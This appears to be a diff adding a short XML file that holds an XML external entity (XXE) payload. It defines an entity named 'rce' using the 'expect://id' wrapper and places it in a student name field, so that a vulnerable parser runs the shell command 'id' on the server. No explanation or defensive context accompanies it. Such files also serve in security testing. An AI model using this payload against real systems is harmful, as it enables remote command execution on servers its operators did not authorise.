@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE name [
+<!ENTITY rce SYSTEM "expect://id">
+]>
+   <student>
+             <name>&rce;</name>
+  </student>
